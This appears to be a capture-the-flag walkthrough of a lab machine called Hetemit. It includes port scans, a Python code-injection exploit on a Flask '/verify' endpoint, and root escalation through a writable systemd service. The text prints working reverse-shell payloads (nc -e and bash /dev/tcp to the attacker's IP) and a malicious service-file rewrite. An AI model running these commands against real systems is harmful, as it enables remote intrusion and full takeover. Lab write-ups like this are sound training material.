																							                     Hetemit Walkthrough
																										
Attacker's Machine: 192.168.49.68
Victim's Machine: 192.168.214.117
export IP=192.168.214.117
	
nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s

21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
18000/tcp open  biimenu
50000/tcp open  ibm-db2

nmap -Pn -n -sC -sV -p21,22,80,139,445,18000,50000 $IP --open --stats-every=5s -oN results.txt

21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
18000/tcp open  biimenu?
| fingerprint-strings: 
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)


nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
 <!-- nothing -->

Vulnerability Assessment

nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
nikto --url $IP -p 80

Port 139,445 

enum4linux -a $IP

Cmeeks          Disk      cmeeks Files

smbclient //$IP/cmeeks -N      
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*

Port 18000
http://192.168.214.117:18000/

# Login page, nothing usefull!

Port 50000
http://192.168.214.117:50000/
{'/generate', '/verify'}

# When we access the page, we notice that there are two endpoints available. When we try to access them we get the following messages.

http://192.168.214.117:50000/generate
{'email@domain'}

http://192.168.214.117:50000/verify
{'code'}

# I've intercepted the request in burp and I've changed the request method to POST.

Request:
POST /generate HTTP/1.1
Host: 192.168.214.117:50000

email=test@gmail.com

Response:
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 64
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Tue, 18 Apr 2023 15:39:29 GMT

87924606b4131a8aceeeae8868531fbb9712aaa07a5d3a756b26ce0f5d6ca674

# I've tried to create a new account on port 18000 with the email address test@gmail.com but nothing happened. So we're back to port 50000. 
   The verify endpoint requires a parameter ‘code’. Let's see if we can execute any code on it.
   
Request:
POST /verify HTTP/1.1
Host: 192.168.214.117:50000

code=2*2

Response:
HTTP/1.0 200 OK

4

curl -X POST http://192.168.214.117:50000/verify -d "code=2*2"

# We have code execution! Let's try a reverse shell payload.

curl -X POST http://192.168.214.117:50000/verify --data "code=os.system('nc -e /bin/sh 192.168.45.5 80')"

or 

POST /verify HTTP/1.1
Host: 192.168.214.117:50000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

code=os.system('nc+-e+/bin/sh+192.168.45.5+80')


nc -lvnp 80                                                   # Got shell

cd /home/cmeeks
cat local.txt                                                   # Flag: dc638416e29e171119e18c229872e040


Privilege escalation


sudo -l

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff


cat exploit.sh

#!/bin/bash
nc 192.168.45.5 18000 -e /bin/bash


# We need to look for the system service config file which are writable.

find / -writable -name "*.service" 2>/dev/null
/etc/systemd/system/multi-user.target.wants/pythonapp.service
/etc/systemd/system/systemd-timedated.service
/etc/systemd/system/pythonapp.service

cat /etc/systemd/system/pythonapp.service

[Unit]                                                                                                                                                                                       
Description=Python App                                                                                                                                                                       
After=network-online.target                                                                                                                                                                  
                                                                                                                                                                                             
[Service]                                                                                                                                                                                    
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure


# Let's create a bash script containing a shell which will run by root.

nano exploit.sh
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.45.5/21 0>&1

# Modify the pythonapp.service file

[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit                              # Use the working directory, if not, you can change it
ExecStart=/home/cmeeks/restjson_hetemit/exploit.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target

# If we find a writable file, we can inject a payload into Service.ExecStart.

cat <<EOF > /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit   
ExecStart=/home/cmeeks/shell.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

# Or you can add a command directly into ExecStart

ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.5/80 0>&1'
User=root


# Now restart the system and have a listener opened on the specified port in the bash shell.



/usr/bin/sudo reboot

nc -lvnp 21
listening on [any] 21 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.214.117] 48978
bash: cannot set terminal process group (988): Inappropriate ioctl for device
bash: no job control in this shell
[root@hetemit restjson_hetemit]# id
uid=0(root) gid=0(root) groups=0(root)

cat /root/proof.txt                                  # Flag: f765914d15540056b7e74464f1777b25
